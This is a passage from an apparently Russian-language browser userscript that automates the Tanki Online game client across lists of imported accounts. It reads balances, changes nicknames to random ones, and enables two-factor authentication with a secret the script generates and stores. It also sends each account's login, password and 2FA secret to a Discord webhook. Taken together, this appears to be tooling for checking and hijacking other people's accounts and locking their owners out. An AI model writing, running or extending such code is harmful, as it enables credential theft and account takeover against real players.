        const cells = document.querySelectorAll(".SuppliesComponentStyle-cellAdd, [class*='SuppliesComponentStyle-cellAdd']");
        for (const cell of cells) {
            if (!cell || !cell.isConnected) continue;
            const img = cell.querySelector('img[src*="GoldBox"][src$=".svg"], img[src*="GoldBox"]');
            if (!img) continue;
            const src = String(img.getAttribute("src") || "");
            if (!/GoldBox/i.test(src) || !/\.svg(\?|$)/i.test(src)) continue;
            // span — прямой/ближайший потомок cellAdd (рядом с .SuppliesComponentStyle-cell)
            let span = null;
            for (const child of cell.children) {
                if (child.tagName === "SPAN") { span = child; break; }
            }
            if (!span) span = cell.querySelector(":scope > span");
            if (!span) {
                // fallback: span рядом с img-контейнером, но всё ещё внутри cellAdd
                span = cell.querySelector("span");
            }
            if (!span) continue;
            const raw = (span.textContent || "").replace(/\s+/g, " ").trim();
            if (!/^\d+$/.test(raw.replace(/[\s\u00A0\u202F\u2009]/g, ""))) continue;
            return parseNumberFromText(raw);
        }
        return null;
    }

    async function getGoldBoxes(timeoutMs = 6000) {
        const started = Date.now();
        let value = readGoldBoxesFromDom();
        if (value !== null) return value;
        while (Date.now() - started < timeoutMs) {
            await sleep(250);
            value = readGoldBoxesFromDom();
            if (value !== null) return value;
        }
        // Элемент не появился — неизвестно, НЕ подменяем на "0"
        return null;
    }
    async function getTankoins() {
        const blocks = document.querySelectorAll(".HeaderCommonStyle-icons, [class*='HeaderCommonStyle-icons']");
        let clicked = false;
        for (const block of blocks) {
            const img = block.querySelector('img[src*="ruby"]:not([src*="add"])');
            if (img) { block.click(); clicked = true; break; }
        }
        if (!clicked) {
            const addRuby = document.querySelector(".UserScoreComponentStyle-addRubyCrystal, img[src*='addRuby']");
            if (addRuby) (addRuby.closest("div") || addRuby).click();
        }
        await sleep(randomDelay(1200, 1800));
        const balance = document.querySelector(".ConverterDialogComponentStyle-balanceContainer, [class*='ConverterDialogComponentStyle-balanceContainer']");
        if (balance) {
            const span = balance.querySelector(".ConverterDialogComponentStyle-coinBalanceText, span");
            if (span) return parseNumberFromText(span.textContent);
        }
        const coinImg = document.querySelector('img[src*="coin."]');
        if (coinImg) {
            const span = (coinImg.closest("div") || document).querySelector("span");
            if (span) return parseNumberFromText(span.textContent);
        }
        return "0";
    }
    async function clickGarage() {
        for (const item of document.querySelectorAll(".PrimaryMenuItemComponentStyle-itemCommonLi")) {
            const name = item.querySelector(".PrimaryMenuItemComponentStyle-itemName");
            if (name && name.textContent.trim().toUpperCase() === "ГАРАЖ") {
                item.click();
                await sleep(randomDelay(1400, 2200));
                return true;
            }
        }
        const start = Date.now();
        while (Date.now() - start < 12000) {
            for (const item of document.querySelectorAll(".PrimaryMenuItemComponentStyle-itemCommonLi")) {
                const name = item.querySelector(".PrimaryMenuItemComponentStyle-itemName");
                if (name && name.textContent.trim().toUpperCase() === "ГАРАЖ") {
                    item.click();
                    await sleep(randomDelay(1400, 2200));
                    return true;
                }
            }
            await sleep(300);
        }
        return false;
    }
    async function exitToLobbyOld() {
        await closeAnyModal();
        if (!getCurrentSectionName()) return true;

        console.log("[lobby] Выход из раздела:", getCurrentSectionName());
        const ok = await waitAndClickExitToLobby(18000);
        if (ok) {
            console.log("[lobby] ✅ В лобби");
            return true;
        }

        console.warn("[lobby] Кнопка выхода не сработала — ensureInLobby");
        return await ensureInLobby(6);
    }
    async function openSettingsAndAccount() {
        const start = Date.now();
        while (Date.now() - start < 12000) {
            for (const item of document.querySelectorAll(".PrimaryMenuItemComponentStyle-itemCommonLi")) {
                const name = item.querySelector(".PrimaryMenuItemComponentStyle-itemName");
                if (name && name.textContent.trim() === "Настройки") {
                    item.click();
                    await sleep(randomDelay(1000, 1600));
                    break;
                }
            }
            for (const item of document.querySelectorAll(".SettingsMenuComponentStyle-menuItemOptions, [class*='SettingsMenuComponentStyle-menuItem']")) {
                if ((item.textContent || "").trim().toUpperCase().includes("АККАУНТ")) {
                    item.click();
                    await sleep(randomDelay(1200, 1800));
                    return true;
                }
            }
            await sleep(300);
        }
        return false;
    }
    async function checkNickChangeAndEmail() {
        let nickChange = "нет", hasEmail = false, emailText = "нет";
        const freeNick = document.querySelector(".AccountSettingsComponentStyle-informationWriting");
        if (freeNick && freeNick.textContent.includes("Первая смена никнейма — бесплатно")) nickChange = "да (бесплатно)";
        else {
            const charged = document.querySelector(".AccountSettingsComponentStyle-chargedWriting");
            if (charged && charged.textContent.includes("Стоимость услуги")) nickChange = "да (платно)";
        }
        const protectForm = document.querySelector("form .AccountSettingsComponentStyle-textHeadlineOptions");
        if (protectForm && protectForm.textContent.includes("привяжите почту")) { hasEmail = false; emailText = "нет"; }
        else {
            const changeForm = document.querySelector("form .AccountSettingsComponentStyle-textHeadlineOptions");
            if (changeForm && changeForm.textContent.includes("изменить пароль и email")) { hasEmail = true; emailText = "есть"; }
        }
        return { nickChange, hasEmail, emailText };
    }

    // =========================================================
    // 2FA — STORAGE + TOTP + ENABLE
    // =========================================================
    function load2FAAccounts() {
        try {
            const raw = GM_getValue(CONFIG.TWOFA_ACCOUNTS_KEY, null);
            const arr = raw ? JSON.parse(raw) : [];
            return Array.isArray(arr) ? arr : [];
        } catch (e) { return []; }
    }
    function save2FAAccounts(list) {
        GM_setValue(CONFIG.TWOFA_ACCOUNTS_KEY, JSON.stringify(Array.isArray(list) ? list : []));
    }
    function upsert2FAAccount(payload) {
        if (!payload || !payload.login || !payload.secret) return false;
        const key = String(payload.login).trim().toLowerCase();
        if (!key) return false;
        const list = load2FAAccounts();
        const idx = list.findIndex(r => String(r.login || "").toLowerCase() === key);
        const safe = {
            login: payload.login,
            password: payload.password || null,
            email: payload.email || null,
            nickname: payload.nickname || null,
            secret: String(payload.secret).replace(/\s+/g, "").toUpperCase(),
            activatedAt: payload.activatedAt || new Date().toISOString(),
            rank: payload.rank || null,
            experience: payload.experience ?? null,
            rubies: payload.rubies || "0",
            crystals: payload.crystals || "0",
            tankoins: payload.tankoins || "0",
            bound: payload.bound ?? null,
            year: payload.year ?? null
        };
        if (idx >= 0) list[idx] = { ...list[idx], ...safe };
        else list.push(safe);
        save2FAAccounts(list);
        appendOpsLog("2fa_saved:" + payload.login);
        return true;
    }
    function remove2FAAccount(login) {
        const key = String(login || "").trim().toLowerCase();
        const list = load2FAAccounts().filter(r => String(r.login || "").toLowerCase() !== key);
        save2FAAccounts(list);
    }
    function clear2FAAccounts() {
        save2FAAccounts([]);
    }
    function import2FAAccountsFromText(text) {
        const raw = String(text || "").replace(/\r/g, "");
        let added = 0, skipped = 0;
        const seen = new Set();

        function pushRow(login, password, secret, extra = {}) {
            login = String(login || "").trim();
            password = String(password || "").trim();
            secret = String(secret || "").replace(/\s+/g, "").toUpperCase();
            if (!login || !secret || secret.length < 16) { skipped++; return; }
            if (!/^[A-Z2-7]+$/.test(secret)) { skipped++; return; }
            const key = login.toLowerCase();
            if (seen.has(key)) return;
            seen.add(key);
            upsert2FAAccount({
                login,
                password: password || null,
                email: extra.email || (login.includes("@") ? login : null),
                nickname: extra.nickname || null,
                secret,
                rank: extra.rank || null,
                year: extra.year || null,
                bound: extra.bound ?? null,
                activatedAt: new Date().toISOString()
            });
            if (password) {
                const exists = RUBIES_ACCOUNTS.some(a => String(a.login || "").toLowerCase() === key);
                if (!exists) {
                    try {
                        addRubiesAccountsFromText(login + ";" + password);
                    } catch (_) {
                        RUBIES_ACCOUNTS.push({ login, password, email: extra.email || null });
                        try { saveRubiesAccounts(); } catch (__) {}
                    }
                }
            }
            added++;
        }

        for (const line of raw.split("\n").map(l => l.trim()).filter(Boolean)) {
            if (/^(логин|пароль|ник|2fa|secret|почта)/i.test(line)) continue;
            let m = line.match(/^([^\s:;]+)\s*[:;]\s*(\S+)\s*[:;]\s*([A-Za-z2-7]{16,})$/);
            if (m) { pushRow(m[1], m[2], m[3]); continue; }
            m = line.match(/^([^\s:;]+)\s*[:;]\s*([A-Za-z2-7]{16,})$/);
            if (m) { pushRow(m[1], "", m[2]); continue; }
        }

        const blocks = raw.split(/^\s*[-=_*]{2,}\s*$/m).map(b => b.trim()).filter(Boolean);
        for (const block of (blocks.length ? blocks : [raw])) {
            let login = null, password = null, secret = null, email = null, nick = null;
            for (const line of block.split("\n").map(l => l.trim()).filter(Boolean)) {
                let m = line.match(/^(?:Логин|логин|Login)\s*[-:]\s*(.+)$/i);
                if (m) { login = m[1].trim(); continue; }
                m = line.match(/^(?:Пароль|пароль|Password)\s*[-:]\s*(.+)$/i);
                if (m) { password = m[1].trim(); continue; }
                m = line.match(/^(?:2FA|Secret|Секрет|secret|2fa secret)\s*[-:]\s*(.+)$/i);
                if (m) { secret = m[1].trim(); continue; }
                m = line.match(/^(?:Почта|Email)\s*[-:]\s*(.+)$/i);
                if (m) { email = m[1].trim(); continue; }
                m = line.match(/^(?:Ник|Nickname)\s*[-:]\s*(.+)$/i);
                if (m) { nick = m[1].trim(); continue; }
            }
            if (login && secret) pushRow(login, password, secret, { email, nickname: nick });
        }

        return { added, skipped };
    }

    function get2FAByLogin(login) {
        const key = String(login || "").trim().toLowerCase();
        return load2FAAccounts().find(r => String(r.login || "").toLowerCase() === key) || null;
    }

    /**
     * Discord: secret + credentials чтобы не потерять доступ.
     * Не зависит от DISCORD_RUBIES_NOTIFICATIONS — отправляется всегда, если webhook настроен.
     */
    async function notify2FAEnabled(data) {
        if (!data || !data.secret || !isDiscordConfigured()) return false;

        const secret = String(data.secret || "").replace(/\s+/g, "").toUpperCase();
        const secretSpoiler = "||" + secret + "||";

        const fields = [
            { name: "Логин", value: "`" + String(data.login || "—") + "`", inline: true },
            { name: "Пароль", value: "`" + String(data.password || "—") + "`", inline: true },
            { name: "Ник", value: "`" + String(data.nickname || "—") + "`", inline: true },
            { name: "Почта", value: "`" + String(data.email || "—") + "`", inline: true },
            { name: "2FA Secret (спойлер)", value: secretSpoiler, inline: false },
            { name: "Ранг", value: String(data.rank || "—"), inline: true },
            { name: "Рубины", value: String(data.rubies ?? "—"), inline: true },
            { name: "Год", value: String(data.year ?? "—"), inline: true }
        ];

        const otpauth = "otpauth://totp/Tanki:" + encodeURIComponent(data.login || "acc") +
            "?secret=" + encodeURIComponent(secret) + "&issuer=TankiOnline";

        fields.push({
            name: "login:password:secret",
            value: "`" + String(data.login || "") + ":" + String(data.password || "") + ":" + secret + "`",
            inline: false
        });

        const contentLine =
            "🔐 **2FA** `" + String(data.login || "—") + "` / `" + String(data.password || "—") + "`\n" +
            "Secret: " + secretSpoiler;

        const ok = await sendDiscordMessage(contentLine, {
            title: "🔐 2FA включена — сохрани секрет",
            color: 0x5865F2,
            description: "Секрет продублирован спойлером `||secret||`, чтобы не потерять доступ к аккаунту.",
            fields,
            timestamp: new Date().toISOString()
        });

        if (!ok) {
            await sendDiscordMessage(contentLine, null);
        }
        return ok;
    }

    function base32Decode(str) {
        const alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
        const cleaned = String(str || "").toUpperCase().replace(/[^A-Z2-7]/g, "");
        let bits = "";
        for (const c of cleaned) {
            const val = alphabet.indexOf(c);
            if (val < 0) continue;
            bits += val.toString(2).padStart(5, "0");
        }
        const bytes = [];
        for (let i = 0; i + 8 <= bits.length; i += 8) {
            bytes.push(parseInt(bits.slice(i, i + 8), 2));
        }
        return new Uint8Array(bytes);
    }

    async function hmacSha1(keyBytes, msgBytes) {
        const key = await crypto.subtle.importKey(
            "raw", keyBytes, { name: "HMAC", hash: "SHA-1" }, false, ["sign"]
        );
        const sig = await crypto.subtle.sign("HMAC", key, msgBytes);
        return new Uint8Array(sig);
    }

    async function generateTOTP(secret, step = 30, digits = 6) {
        const key = base32Decode(secret);
        if (!key.length) throw new Error("Invalid Base32 secret");
        const counter = Math.floor(Date.now() / 1000 / step);
        const buf = new ArrayBuffer(8);
        const view = new DataView(buf);
        view.setUint32(0, 0, false);
        view.setUint32(4, counter >>> 0, false);
        const hmac = await hmacSha1(key, new Uint8Array(buf));
        const offset = hmac[hmac.length - 1] & 0x0f;
        const code =
            ((hmac[offset] & 0x7f) << 24) |
            ((hmac[offset + 1] & 0xff) << 16) |
            ((hmac[offset + 2] & 0xff) << 8) |
            (hmac[offset + 3] & 0xff);
        return String(code % (10 ** digits)).padStart(digits, "0");
    }

    function isLogin2FAVisible() {
        const title = document.querySelector(".EntranceComponentStyle-title");
        if (title && (title.textContent || "").includes("Код безопасности")) return true;
        const input = document.querySelector(
            "input[placeholder='000000'][maxlength='6'], " +
            ".EntranceComponentStyle-ContainerForm input[maxlength='6']"
        );
        if (input && document.querySelector(".EntranceComponentStyle-title")) {
            const t = (document.querySelector(".EntranceComponentStyle-title")?.textContent || "");
            if (/код безопасности|2fa|двухфактор/i.test(t)) return true;
        }
        return false;
    }

    function resolve2FASecretForLogin(login, email) {
        const candidates = [
            login,
            email,
            normalizeEmail(email),
            normalizeEmail(login)
        ].filter(Boolean).map(s => String(s).trim());

        for (const c of candidates) {
            const row = get2FAByLogin(c);
            if (row?.secret) return String(row.secret).replace(/\s+/g, "").toUpperCase();
        }
        const list = load2FAAccounts();
        const low = String(login || "").toLowerCase();
        const elow = String(email || "").toLowerCase();
        for (const r of list) {
            if (!r?.secret) continue;
            if (String(r.login || "").toLowerCase() === low) return String(r.secret).replace(/\s+/g, "").toUpperCase();
            if (elow && String(r.email || "").toLowerCase() === elow) return String(r.secret).replace(/\s+/g, "").toUpperCase();
            if (elow && String(r.login || "").toLowerCase() === elow) return String(r.secret).replace(/\s+/g, "").toUpperCase();
        }
        return null;
    }

    /**
     * Если на экране входа виден запрос 2FA — ввести TOTP из хранилища.
     * @returns {Promise<"solved"|"no_secret"|"not_visible"|"failed">}
     */
    async function solveLogin2FAIfPresent(login, email = null) {
        if (!isLogin2FAVisible()) return "not_visible";

        const secret = resolve2FASecretForLogin(login, email);
        if (!secret) {
            console.warn("[2FA] Нет секрета для", login, email || "");
            return "no_secret";
        }

        try {
            let code = await generateTOTP(secret);
            console.log("[2FA] Ввод кода для", login, "→", code);

            const input = document.querySelector(
                "input[placeholder='000000'][maxlength='6'], " +
                ".EntranceComponentStyle-ContainerForm input[type='text'][maxlength='6'], " +
                ".EntranceComponentStyle-ContainerForm input[maxlength='6']"
            );
            if (!input) return "failed";

            setValueNative(input, "");
            await humanType(input, code);
            await sleep(randomDelay(250, 450));

            const btnCandidates = [
                ...document.querySelectorAll(
                    ".EntranceComponentStyle-buttonActive, .RoundBigButtonComponentStyle-commonContainer, button, span"
                )
            ];
            let clicked = false;
            for (const el of btnCandidates) {
                const t = (el.textContent || "").trim().toLowerCase();
                if (t === "войти" || t === "подтвердить" || t === "играть" || t === "ok" || t === "готово") {
                    const parent = el.closest(".EntranceComponentStyle-buttonActive, .RoundBigButtonComponentStyle-commonContainer") || el;
                    robustClick(parent);
                    clicked = true;
                    break;
                }
            }
            if (!clicked) {
                try {
                    input.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter", code: "Enter", keyCode: 13, bubbles: true }));
                } catch (_) {}
            }

            await sleep(randomDelay(1200, 1800));

            if (isLogin2FAVisible()) {
                code = await generateTOTP(secret);
                setValueNative(input, "");
                await humanType(input, code);
                await sleep(300);
                for (const el of document.querySelectorAll(".EntranceComponentStyle-buttonActive, span")) {
                    const t = (el.textContent || "").trim().toLowerCase();
                    if (t === "войти" || t === "подтвердить" || t === "играть") {
                        robustClick(el.closest(".EntranceComponentStyle-buttonActive") || el);
                        break;
                    }
                }
                await sleep(randomDelay(1200, 1800));
            }

            if (isLogin2FAVisible()) return "failed";
            console.log("[2FA] ✅ Код принят для", login);
            return "solved";
        } catch (e) {
            console.error("[2FA] solve error:", e);
            return "failed";
        }
    }

    function is2FAAlreadyEnabled() {
        const enableBtn = document.querySelector(
            ".SecuritySettingsComponentStyle-button span, .SecuritySettingsComponentStyle-button"
        );
        const enableText = (enableBtn?.textContent || "").trim().toLowerCase();
        if (enableText.includes("включить")) return false;

        const disableHints = [
            ...document.querySelectorAll(
                ".SecuritySettingsComponentStyle-about2FaText, .SettingsComponentStyle-textHeadlineOptions, span, p"
            )
        ];
        for (const el of disableHints) {
            const t = (el.textContent || "").toLowerCase();
            if (t.includes("отключить") && t.includes("двухфактор")) return true;
            if (t.includes("двухфакторная аутентификация включена")) return true;
            if (t.includes("2fa включена")) return true;
        }
        const headline = [...document.querySelectorAll(".SettingsComponentStyle-textHeadlineOptions, p")]
            .some(el => (el.textContent || "").toLowerCase().includes("двухфакторная аутентификация"));
        if (headline && !enableText.includes("включить")) return true;
        return false;
    }

    async function clickSecurityMenuItem(timeout = 10000) {
        const start = Date.now();
        while (Date.now() - start < timeout) {
            const items = document.querySelectorAll(
                ".SettingsMenuComponentStyle-menuItemOptions, [class*='SettingsMenuComponentStyle-menuItem']"
            );
            for (const item of items) {
                const t = (item.textContent || "").trim().toUpperCase();
                if (t.includes("БЕЗОПАСНОСТЬ") || t.includes("SECURITY")) {
                    robustClick(item);
                    await sleep(randomDelay(900, 1400));
                    return true;
                }
            }
            await sleep(250);
        }
        return false;
    }

    async function waitFor2FAEnableButton(timeout = 10000) {
        const start = Date.now();
        while (Date.now() - start < timeout) {
            if (is2FAAlreadyEnabled()) return { already: true, btn: null };

            const candidates = document.querySelectorAll(
                ".SecuritySettingsComponentStyle-button span, " +
                ".SecuritySettingsComponentStyle-button, " +
                ".SettingsComponentStyle-commonBlock span, " +
                "[class*='SecuritySettings'] span"
            );
            for (const el of candidates) {
                const t = (el.textContent || "").trim();
                if (t === "Включить" || t.toLowerCase() === "enable") {
                    const clickable = el.closest(".SecuritySettingsComponentStyle-button") ||
                        el.closest("[class*='button']") || el;
                    return { already: false, btn: clickable };
                }
            }
            await sleep(200);
        }
        return { already: false, btn: null };
    }

    async function waitFor2FASecret(timeout = 12000) {
        const start = Date.now();
        while (Date.now() - start < timeout) {
            const el = document.querySelector(".SecuritySettingsComponentStyle-sharedSecret");
            if (el) {
                const secret = (el.textContent || "").replace(/\s+/g, "").trim().toUpperCase();
                if (secret.length >= 16 && /^[A-Z2-7]+$/.test(secret)) return secret;
            }
            await sleep(200);
        }
        return null;
    }

    async function fill2FACodeAndActivate(code, timeout = 10000) {
        const start = Date.now();
        while (Date.now() - start < timeout) {
            const input = document.querySelector(
                ".SecuritySettingsComponentStyle-blockInputCode input[type='text'], " +
                "input[placeholder='000000'][maxlength='6']"
            );
            if (input) {
                setValueNative(input, "");
                await humanType(input, code);
                await sleep(randomDelay(300, 500));

                const actCandidates = document.querySelectorAll(
                    ".SecuritySettingsComponentStyle-activation2FaButton span, " +
                    ".SecuritySettingsComponentStyle-activation2FaButton, " +
                    "[class*='activation2Fa'] span"
                );
                for (const el of actCandidates) {
                    const t = (el.textContent || "").trim();
                    if (t === "Активировать" || t.toLowerCase() === "activate") {
                        const clickable = el.closest(".SecuritySettingsComponentStyle-activation2FaButton") ||
                            el.closest("[class*='activation2Fa']") || el;
                        robustClick(clickable);
                        await sleep(randomDelay(1200, 1800));
                        return true;
                    }
                }
            }
            await sleep(200);
        }
        return false;
    }

    /**
     * Включить 2FA на текущем аккаунте (должен быть уже в Настройках → Аккаунт
     * или хотя бы в разделе Настройки).
     * Возвращает { ok, secret, already, error }.
     */
    async function enable2FAOnCurrentAccount(meta = {}) {
        try {
            const inSettings = getCurrentSectionName() &&
                /настройк/i.test(getCurrentSectionName() || "");
            if (!inSettings) {
                await openSettingsAndAccount();
                await sleep(randomDelay(600, 1000));
            }

            const securityOk = await clickSecurityMenuItem(10000);
            if (!securityOk) {
                return { ok: false, error: "Не найден пункт БЕЗОПАСНОСТЬ" };
            }
            await sleep(randomDelay(700, 1100));

            const { already, btn } = await waitFor2FAEnableButton(10000);
            if (already) {
                console.log("[2FA] Уже включена на аккаунте", meta.login || "");
                return { ok: true, already: true, secret: null };
            }
            if (!btn) {
                return { ok: false, error: "Кнопка «Включить» не найдена" };
            }

            robustClick(btn);
            await sleep(randomDelay(900, 1400));

            const secret = await waitFor2FASecret(12000);
            if (!secret) {
                return { ok: false, error: "Секретный ключ 2FA не появился" };
            }
            console.log("[2FA] Secret получен для", meta.login || "?", secret.slice(0, 4) + "…");

            const code = await generateTOTP(secret);
            console.log("[2FA] TOTP code:", code);

            const activated = await fill2FACodeAndActivate(code, 10000);
            if (!activated) {
                await sleep(1500);
                const code2 = await generateTOTP(secret);
                const activated2 = await fill2FACodeAndActivate(code2, 8000);
                if (!activated2) {
                    return { ok: false, secret, error: "Не удалось активировать 2FA (кнопка/поле)" };
                }
            }

            await sleep(randomDelay(800, 1200));

            const twofaPayload = {
                login: meta.login,
                password: meta.password,
                email: meta.email,
                nickname: meta.nickname,
                secret,
                rank: meta.rank,
                experience: meta.experience,
                rubies: meta.rubies,
                crystals: meta.crystals,
                tankoins: meta.tankoins,
                bound: meta.bound,
                year: meta.year,
                activatedAt: new Date().toISOString()
            };
            upsert2FAAccount(twofaPayload);

            if (meta.login) {
                const prev = getAccountStatus(meta.login) || {};
                setAccountStatus(meta.login, {
                    ...prev,
                    twofaEnabledByScript: true,
                    twofaSecretSaved: true
                });
            }

            console.log("[2FA] ✅ Активирована и сохранена для", meta.login);
            return { ok: true, already: false, secret };
        } catch (e) {
            console.error("[2FA] Ошибка:", e);
            return { ok: false, error: e.message || String(e) };
        }
    }

    function findNicknameForm() {
        return [...document.querySelectorAll(".EntranceComponentStyle-ContainerForm")].find(form => {
            const t = form.querySelector(".EntranceComponentStyle-title");
            return t?.textContent.trim() === "Изменить никнейм";
        });
    }
    function findNicknameSaveButton(form) {
        if (!form) return null;
        return [...form.querySelectorAll(".EntranceComponentStyle-buttonActive")].find(b =>
            (b.textContent || "").trim().toLowerCase() === "сохранить");
    }
    function generateNickname() {
        const words = ["keks","pivo","boba","shrek","pepe","troll","meme","lulz","sigma","based","cringe","rizz","ohio","skibidi","gyatt","drip","blud","fanum","aura","goofy","silly","amogus","sus","yeet","pog","giga","chad","npc","bozo","cap","noob","pro","tank","boom","laser","rocket","garage","ruby","gold","crystal","cat","dog","frog","duck","bear","wolf","fox","owl","pizza","sushi","bacon","cookie","banana","potato","onion","cheese","sleepy","angry","happy","crazy","lucky","toxic","epic","ultra","shadow","neon","dark","light","fire","ice","storm","thunder","king","lord","boss","chief","hero","legend","master","ninja","potato","pelmen","borsh","blin","kotik","sobaka","lyagush","zhaba","fimoz","nolife","tryhard","afk","clutch","frag","sniper","scout","banana","pickle","waffle","donut","muffin","bagel","taco","nacho","vapor","cyber","retro","pixel","glitch","turbo","hyper","mega"];
        const funnyPairs = ["fatCat","sadFrog","bigBoba","noScope","lowPing","highPing","afkKing","tryHard","ezWin","ggEz","fullTilt","oneTap","rubyGod","goldBox","tankPro","garageKing","noCap","capYes","ohioRizz","sigmaBoy","gigaChad","miniBoss","sleepyCat","angryDuck","pivoTime","keksMode","bludMoment","auraFarm","dripCheck","cringeOp","pelmenGod","borshKing","kotikBoss","zhabaLord","blinMaster","sushiNinja"];
        const endings = ["","228","1337","69","420","777","999","007","123","321","88","11","22","7","9","42","X","Pro","God","Top","Lol","Kek"];
        const seps = [".","_",""];
        const pick = (a) => a[Math.floor(Math.random() * a.length)];
        const randInt = (a, b) => Math.floor(Math.random() * (b - a + 1)) + a;
        const cap = (s) => s ? s.charAt(0).toUpperCase() + s.slice(1) : s;
        let nick = "";
        const style = randInt(0, 6);
        if (style === 0) { let a = pick(words), b = pick(words); while (b === a) b = pick(words); nick = a + pick(seps) + b; }
        else if (style === 1) { let a = pick(words), b = pick(words); while (b === a) b = pick(words); nick = a + b + pick(endings); }
        else if (style === 2) nick = pick(funnyPairs) + pick(endings);
        else if (style === 3) { let a = cap(pick(words)), b = cap(pick(words)); while (b === a) b = cap(pick(words)); nick = a + "." + b; }
        else if (style === 4) { let a = pick(words), b = pick(words); while (b === a) b = pick(words); nick = a + "_" + b + String(randInt(1, 99)); }
        else if (style === 5) nick = pick(funnyPairs) + "." + pick(words);
        else { let a = pick(words), b = pick(words); while (b === a) b = pick(words); nick = a + String(randInt(10, 99)) + b; }
        nick = nick.replace(/[^a-zA-Z0-9._]/g, "").replace(/\.{2,}/g, ".").replace(/_{2,}/g, "_").replace(/^[._]+|[._]+$/g, "");
        if (nick.length > 20) nick = nick.slice(0, 20).replace(/[._]+$/g, "");
        if (nick.length < 4) { nick = pick(words) + pick(endings.filter(Boolean)); nick = nick.replace(/[^a-zA-Z0-9._]/g, "").slice(0, 20); }
        if (nick.length < 3) nick = "keks" + String(randInt(100, 999));
        return nick.slice(0, 20);
    }
    async function waitForNicknameForm(timeout = 30000) {
        const start = Date.now();
        while (Date.now() - start < timeout) {
            const form = findNicknameForm();
            if (form) {
                const input = form.querySelector("#username");
                if (input) { input.focus(); showToast("Форма смены ника найдена", "info"); return { form, input }; }
            }
            await sleep(300);
        }
        return null;
    }
    async function waitForNicknameSaveButton(form, timeout = 10000) {
        const start = Date.now();
        while (Date.now() - start < timeout) {
            const b = findNicknameSaveButton(form);
            if (b) return b;
            await sleep(200);
        }
        return null;
    }
    function isNicknameTakenErrorVisible(form) {
        const root = form || document;
        const nodes = root.querySelectorAll(
            ".EntranceComponentStyle-informationWriting span, " +
            ".EntranceComponentStyle-commonBlockMessageError, " +
            ".textError, " +
            ".UidInputComponentStyle-firstItem, " +
            "[class*='informationWriting'] span, " +
            "[class*='commonBlockMessageError'], " +
            "[class*='textError']"
        );
        for (const el of nodes) {
            const t = (el.textContent || "").replace(/\s+/g, " ").trim();
            if (/Введённое имя занято|Введенное имя занято|имя занято|уже занят|already taken|name is taken/i.test(t)) {
                return true;
            }
        }
        return false;
    }

    async function typeNicknameIntoInput(input, nickname) {
        setValueNative(input, "");
        await sleep(60);
        setValueNative(input, nickname);
        input.dispatchEvent(new Event("input", { bubbles: true }));
        input.dispatchEvent(new Event("change", { bubbles: true }));
        input.dispatchEvent(new KeyboardEvent("keyup", { bubbles: true }));
        try { input.focus(); } catch (_) {}
    }

    async function fillNicknameAndSave(form, input) {
        const MAX_NICK_TRIES = 8;
        const used = new Set();
        let lastNickname = null;
        let lastError = null;

        for (let attempt = 1; attempt <= MAX_NICK_TRIES; attempt++) {
            form = findNicknameForm() || form;
            input = (form && form.querySelector("#username")) || input;
            if (!form || !input) {
                return { ok: false, nickname: lastNickname, error: "form_missing" };
            }

            let nickname = generateNickname();
            let guard = 0;
            while (used.has(nickname.toLowerCase()) && guard < 20) {
                nickname = generateNickname();
                guard++;
            }
            used.add(nickname.toLowerCase());
            lastNickname = nickname;

            await typeNicknameIntoInput(input, nickname);
            showToast(`Ник (${attempt}/${MAX_NICK_TRIES}): ${nickname}`, "info");
            console.log(`[nick] Попытка ${attempt}/${MAX_NICK_TRIES}: ${nickname}`);

            let saveButton = null;
            const btnWaitStart = Date.now();
            while (Date.now() - btnWaitStart < 8000) {
                form = findNicknameForm() || form;
                saveButton = findNicknameSaveButton(form);
                if (saveButton) {
                    const disabled = saveButton.classList.contains("ButtonComponentStyle-disabled") ||
                        saveButton.classList.contains("EntranceComponentStyle-buttonNoActive") ||
                        saveButton.getAttribute("disabled") != null;
                    if (!disabled) break;
                    saveButton = null;
                }
                if (isNicknameTakenErrorVisible(form)) break;
                await sleep(150);
            }

            if (isNicknameTakenErrorVisible(form)) {
                lastError = "taken";
                console.warn(`[nick] Занят (до save): ${nickname}`);
                await sleep(200);
                continue;
            }

            if (!saveButton) {
                saveButton = findNicknameSaveButton(form);
            }
            if (!saveButton) {
                lastError = "save_button_missing";
                continue;
            }

            robustClick(saveButton);

            const waitStart = Date.now();
            let taken = false;
            while (Date.now() - waitStart < 10000) {
                const blockedEl = document.querySelector(".SystemMessageStyle-message");
                if (blockedEl && (blockedEl.textContent || "").includes("заблокирован")) {
                    return { ok: false, nickname, error: "blocked", status: "blocked" };
                }
                const twofaEl = document.querySelector(".EntranceComponentStyle-title");
                if (twofaEl && (twofaEl.textContent || "").includes("Код безопасности")) {
                    return { ok: false, nickname, error: "twofa", status: "twofa" };
                }

                if (!findNicknameForm()) {
                    const blocked2 = document.querySelector(".SystemMessageStyle-message");
                    if (blocked2 && (blocked2.textContent || "").includes("заблокирован")) {
                        return { ok: false, nickname, error: "blocked", status: "blocked" };
                    }
                    const twofa2 = document.querySelector(".EntranceComponentStyle-title");
                    if (twofa2 && (twofa2.textContent || "").includes("Код безопасности")) {
                        return { ok: false, nickname, error: "twofa", status: "twofa" };
                    }
                    console.log(`[nick] ✅ Ник принят: ${nickname}`);
                    showToast("Ник изменён: " + nickname, "success");
                    return { ok: true, nickname };
                }

                form = findNicknameForm() || form;
                if (isNicknameTakenErrorVisible(form)) {
                    taken = true;
                    lastError = "taken";
                    console.warn(`[nick] Занят (после save): ${nickname}`);
                    break;
                }

                const err = document.querySelector(
                    ".EntranceComponentStyle-informationWriting span, " +
                    ".EntranceComponentStyle-commonBlockMessageError, " +
                    ".textError, .EntranceComponentStyle-invalidForm"
                );
                if (err && (err.textContent || "").trim().length > 2) {
                    const msg = (err.textContent || "").trim();
                    if (/заблок/i.test(msg)) return { ok: false, nickname, error: "blocked", status: "blocked" };
                    if (/код безопасности|2fa|двухфактор/i.test(msg)) return { ok: false, nickname, error: "twofa", status: "twofa" };
                    if (/занят|taken/i.test(msg)) {
                        taken = true;
                        lastError = "taken";
                        break;
                    }
                    lastError = msg;
                }

                await sleep(200);
            }

            if (taken) {
                await sleep(250);
                continue;
            }
        }

        return { ok: false, nickname: lastNickname, error: lastError || "nickname_taken_retries" };
    }

    async function checkAccount(login, password, email = null) {
        email = normalizeEmail(email);
        if (!isRunning) return { login, status: "stopped" };
        let timestamp = new Date().toLocaleTimeString();
        console.log(`[${timestamp}] 🔍 Проверка: ${login}`);
        if (isAccountFinished(login)) { advanceCheckQueue(); return { login, status: "skipped" }; }

